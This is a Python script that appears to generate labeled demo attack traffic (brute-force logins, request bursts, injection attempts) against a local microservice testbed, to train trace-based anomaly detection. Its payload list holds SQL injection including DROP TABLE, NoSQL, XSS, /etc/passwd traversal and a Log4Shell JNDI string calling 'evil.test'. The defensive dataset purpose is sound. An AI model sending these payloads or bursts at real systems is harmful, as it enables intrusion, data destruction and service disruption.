#!/usr/bin/env python3
"""
generate_attack_traffic.py — PRELIMINARY / DEMO attack traffic generator.

**This is not the official Phase 2 frozen attack corpus.** It exists to:
  1. Give parse_jaeger_traces.py something labeled "attack" to develop and
     sanity-check against while Phase 1 is in progress.
  2. Give you an early, concrete look at what these attack classes actually
     look like in traces before committing to the full corpus design.

Covers three of the five planned attack classes using the CURRENT API
surface — no code changes to any service required:
  - auth_abuse:          repeated failed logins (brute-force pattern)
  - resource_exhaustion: rapid, unpaced request bursts (no human_pause)
  - injection_attempt:   SQL/NoSQL metacharacter payloads in station/contact
                          fields

NOT covered here — SSRF is the primary attack class in the plan but
requires injecting a vulnerable endpoint into a forked service (Phase 2
Step 1, "SSRF-vulnerable endpoint injected"). That's separate, larger work.
Data-exfiltration is also deferred to the official Phase 2 corpus, since a
convincing version needs the frozen normal corpus as contrast first.

Usage:
    python3 generate_attack_traffic.py --class auth_abuse --count 30
    python3 generate_attack_traffic.py --class resource_exhaustion --count 50
    python3 generate_attack_traffic.py --class injection_attempt --count 20
    python3 generate_attack_traffic.py --class all --out-dir ../../data/raw/attack_demo
"""
import argparse
import json
import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from ts_client import (  # noqa: E402
    DEMO_USER, GATEWAY, get_or_create_contact, login, search_trips,
)
import requests  # noqa: E402


class ActionLogger:
    def __init__(self, out_path: Path):
        self.out_path = out_path
        self.out_path.parent.mkdir(parents=True, exist_ok=True)
        self._fh = open(self.out_path, "a", encoding="utf-8")
        self.window_start = datetime.now()
        self.window_end = self.window_start

    def log(self, attack_class: str, action: str, detail: str = "", **extra) -> None:
        now = datetime.now()
        self.window_end = now
        record = {
            "timestamp": now.isoformat(), "attack_class": attack_class,
            "action": action, "detail": detail, "label": "attack", **extra,
        }
        self._fh.write(json.dumps(record) + "\n")
        self._fh.flush()
        print(f"[attack:{attack_class:<20}] {action:<20} | {detail}")

    def close(self):
        self._fh.close()


# ---------------------------------------------------------------------------
# Attack class 1: auth_abuse — brute-force login attempts
# ---------------------------------------------------------------------------

def run_auth_abuse(logger: ActionLogger, count: int) -> None:
    """Repeated failed logins against a real username with wrong passwords.
    No human_pause — that pacing gap is itself part of the signature vs.
    normal traffic."""
    target_user = DEMO_USER["username"]
    wrong_passwords = [f"wrongpass{i}" for i in range(count)]
    for i, pw in enumerate(wrong_passwords):
        try:
            resp = requests.post(
                f"{GATEWAY}/api/v1/users/login",
                json={"username": target_user, "password": pw},
                timeout=10,
            )
            body = resp.json()
            logger.log("auth_abuse", "failed_login_attempt",
                       f"attempt {i+1}/{count} user={target_user} status={resp.status_code} "
                       f"response_status={body.get('status')}")
        except Exception as e:
            logger.log("auth_abuse", "failed_login_attempt", f"attempt {i+1}/{count} ERROR: {e}")


# ---------------------------------------------------------------------------
# Attack class 2: resource_exhaustion — rapid unpaced request bursts
# ---------------------------------------------------------------------------

def run_resource_exhaustion(logger: ActionLogger, count: int) -> None:
    """Fire the same expensive search repeatedly with no pacing gap —
    contrast against generate_baseline_traffic.py's human_pause() between
    every action."""
    start = time.time()
    for i in range(count):
        try:
            trips = search_trips("nanjing", "shanghai", "2026-07-28 00:00:00")
            logger.log("resource_exhaustion", "burst_search",
                       f"request {i+1}/{count}: {len(trips)} result(s)")
        except Exception as e:
            logger.log("resource_exhaustion", "burst_search", f"request {i+1}/{count} ERROR: {e}")
    elapsed = time.time() - start
    logger.log("resource_exhaustion", "burst_complete",
               f"{count} requests in {elapsed:.2f}s ({count/max(elapsed,0.01):.1f} req/s)")


# ---------------------------------------------------------------------------
# Attack class 3: injection_attempt — SQL/NoSQL metacharacters in
# user-controlled fields (station search, contact creation)
# ---------------------------------------------------------------------------

INJECTION_PAYLOADS = [
    "shanghai' OR '1'='1",
    "shanghai'; DROP TABLE station; --",
    "{\"$ne\": null}",
    "shanghai\" OR \"\"=\"",
    "shanghai' UNION SELECT * FROM user--",
    "<script>alert(1)</script>",
    "../../../../etc/passwd",
    "shanghai${jndi:ldap://evil.test/a}",
]


def run_injection_attempt(logger: ActionLogger, count: int) -> None:
    """Try each payload against the trip-search station fields. Logged
    regardless of whether the backend actually mishandles it — the point
    for detection purposes is the request pattern (unusual characters in a
    normally-clean field), not just successful exploitation."""
    payloads = (INJECTION_PAYLOADS * ((count // len(INJECTION_PAYLOADS)) + 1))[:count]
    for i, payload in enumerate(payloads):
        try:
            resp = requests.post(
                f"{GATEWAY}/api/v1/travelservice/trips/left",
                json={"startPlace": payload, "endPlace": "shanghai",
                      "departureTime": "2026-07-28 00:00:00"},
                timeout=10,
            )
            logger.log("injection_attempt", "malformed_station_search",
                       f"{i+1}/{count} payload={payload!r} status={resp.status_code}")
        except Exception as e:
            logger.log("injection_attempt", "malformed_station_search",
                       f"{i+1}/{count} payload={payload!r} ERROR: {e}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--class", dest="attack_class", required=True,
                     choices=["auth_abuse", "resource_exhaustion", "injection_attempt", "all"])
    ap.add_argument("--count", type=int, default=20)
    ap.add_argument("--out-dir", type=str, default=".")
    args = ap.parse_args()

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = Path(args.out_dir) / f"attack_demo_session_log_{ts}.jsonl"
    logger = ActionLogger(out_path)

    print(f"PRELIMINARY/DEMO attack traffic — not the official Phase 2 corpus.")
    print(f"Class: {args.attack_class}, count: {args.count}")
    print(f"Logging to: {out_path}\n")

    classes_to_run = (["auth_abuse", "resource_exhaustion", "injection_attempt"]
                       if args.attack_class == "all" else [args.attack_class])

    for cls in classes_to_run:
        {
            "auth_abuse": run_auth_abuse,
            "resource_exhaustion": run_resource_exhaustion,
            "injection_attempt": run_injection_attempt,
        }[cls](logger, args.count)

    logger.close()
    duration_s = int((logger.window_end - logger.window_start).total_seconds())
    lookback = f"{max(duration_s // 60 + 2, 5)}m"
    print(f"\nDone. Window: {logger.window_start.isoformat()} -> {logger.window_end.isoformat()}")
    print(f"Suggested export_jaeger_traces.sh lookback: {lookback}")
    print(f"Session log: {out_path}")
    print(f"\nNext: export with the 'attack' label so parse_jaeger_traces.py auto-detects it, e.g.:")
    print(f"  ../collection/export_jaeger_traces.sh attack_demo_001 ts-order-service 500 {lookback} \"\" \"\" attack")


if __name__ == "__main__":
    main()